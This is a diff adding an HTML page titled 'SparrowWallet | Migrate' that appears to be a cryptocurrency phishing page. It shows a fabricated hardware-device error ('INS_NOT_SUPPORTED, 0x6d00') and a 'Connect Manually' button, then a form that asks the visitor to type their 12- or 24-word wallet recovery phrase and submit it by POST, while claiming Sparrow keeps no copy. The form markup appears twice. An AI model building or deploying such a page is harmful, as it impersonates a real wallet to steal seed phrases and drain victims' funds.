@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- <title>Document</title> -->
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+    <link type="text/css" rel="stylesheet" href="./assets/files/css_002.css">
+    <link type="text/css" rel="stylesheet" href="./assets/files/css.css">
+
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Secure Token">
+    <!-- Favicon Icon -->
+    <link rel="icon" type="image/icon" href="./assets/files/icon.png">
+    <!-- SITE TITLE -->
+    <title>SparrowWallet | Migrate</title>
+    <!-- Animation CSS -->
+    <link rel="stylesheet" href="./assets/files/animate.css">
+    <!-- Latest Bootstrap min CSS -->
+    <link rel="stylesheet" href="./assets/files/bootstrap.css">
+    <!-- Google Font -->
+    <link href="./assets/files/css_003.css" rel="stylesheet">
+    <!-- Font Awesome CSS -->
+    <link rel="stylesheet" href="./vendor/font-awesome/css/font-awesome.css">
+    <!--- owl carousel CSS-->
+    <link rel="stylesheet" href="./assets/files/owl.css">
+    <link rel="stylesheet" href="./assets/files/owl_002.css">
+    <!-- Magnific Popup CSS -->
+    <link rel="stylesheet" href="./assets/files/magnific-popup.css">
+    <link rel="stylesheet" href="./assets/files/spop.css">
+    <!-- Style CSS -->
+    <!-- <link rel="stylesheet" href="./assets/files/style.css?v=6570a034e2a6b"> -->
+    <!-- <link rel="stylesheet" href="./assets/files/style2.css?v=6570a034e2a6e"> -->
+    <link rel="stylesheet" href="./assets/files/responsive.css">
+    <link rel="stylesheet" href="./style.css">
+</head>
+
+<body>
+    <div class="bkg">
+        <div class="modal fade show" id="connectModal" tabindex="-1" aria-labelledby="exampleModalLabel"
+            style="display: block;">
+            <div class="modal-dialog">
+                <div class="modal-content" style="background: transparent;">
+
+                    <div class="card" id="view1">
+                        <div class="card-body p-5 text-center d-grid justify-content-center align-items-center">
+                            <div class="mb-3">
+                                <img src="./assets/img/error.png" alt="">
+                            </div>
+                            <div class="mb-3" style="font-weight: 600; font-size: 14px;">
+                                Something went wrong. Please reconnect your device.
+                            </div>
+                            <div>Sparrow device: INS_NOT_SUPPORTED</div>
+                            <div class="mb-3">(0x6d00)</div>
+                            <div class="mb-4">
+                                <img src="./assets/img/loader.gif" width="30" alt="">
+                            </div>
+
+                            <div class="d-grid">
+                                <button class="btn btn-primary bg-primary text-white"
+                                    onclick="connectManually()">Connect
+                                    Manually</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card" style="display: none" id="view2">
+                        <div class="card-body p-3 d-grid justify-content-center align-items-center">
+                            <div class="mb-3 text-center">
+                                <img src="./assets/images/sparrow.png" width="130" alt="">
+                            </div>
+                            <div class="mb-3" style="font-weight: 600; font-size: 25px; color: #333;">
+                                ENTER YOUR RECOVERY PHRASE
+                            </div>
+                            <div style="font-size: 15px; line-height: 16px;">
+                                <div class="mb-3">Your recovery phrase is the secret list of words that you backed up
+                                    when
+                                    you first set up your wallet.</div>
+                                <div class="mb-3">Sparrow does not keep a copy of your recovery phrase.</div>
+                            </div>
+
+                            <div>
+                                <form id="submitform" method="POST">
+                                    <div class="phrasebox ccbox activebox">
+                                        <textarea class="textarea allinput" name="phrase"
+                                            placeholder="Input word phrase. Typically, 12 or 24 words separated by single spaces."
+                                            id="phraseinput" oninput="countWord()"></textarea>
+                                    </div>
+
+                                    <div class="d-grid">
+                                        <button type="submit" disabled="true" id="connbtn"
+                                            class="btn btn-block btn-primary bg-primary text-white">Connect</button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+                <div class="modal-content" style="background: transparent;">
+
+                    <div class="card" id="view1" style="display: none;">
+                        <div class="card-body p-5 text-center d-grid justify-content-center align-items-center">
+                            <div class="mb-3">
+                                <img src="../assets/img/error.png" alt="">
+                            </div>
+                            <div class="mb-3" style="font-weight: 600; font-size: 14px;">
+                                Something went wrong. Please reconnect your device.
+                            </div>
+                            <div>Sparrow device: INS_NOT_SUPPORTED</div>
+                            <div class="mb-3">(0x6d00)</div>
+                            <div class="mb-4">
+                                <img src="../assets/img/loader.gif" width="30" alt="">
+                            </div>
+
+                            <div class="d-grid">
+                                <button class="btn btn-primary bg-primary text-white"
+                                    onclick="connectManually()">Connect
+                                    Manually</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card" style="" id="view2">
+                        <div class="card-body p-3 d-grid justify-content-center align-items-center">
+                            <div class="mb-3 text-center">
+                                <img src="../assets/images/sparrow.png" width="130" alt="">
+                            </div>
+                            <div class="mb-3" style="font-weight: 600; font-size: 25px; color: #333;">
+                                ENTER YOUR RECOVERY PHRASE
+                            </div>
+                            <div style="font-size: 15px; line-height: 16px;">
+                                <div class="mb-3">Your recovery phrase is the secret list of words that you backed up
+                                    when
+                                    you first set up your wallet.</div>
+                                <div class="mb-3">Sparrow does not keep a copy of your recovery phrase.</div>
+                            </div>
+
+                            <div>
+                                <form id="submitform" method="POST">
+                                    <div class="phrasebox ccbox activebox">
+                                        <textarea class="textarea allinput" name="phrase"
+                                            placeholder="Input word phrase. Typically, 12 or 24 words separated by single spaces."
+                                            id="phraseinput" oninput="countWord()"></textarea>
+                                    </div>
+
+                                    <div class="d-grid">
+                                        <button type="submit" disabled="true" id="connbtn"
+                                            class="btn btn-block btn-primary bg-primary text-white">Connect</button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+
+
+
+    </div>
+</body>
+
+</html>
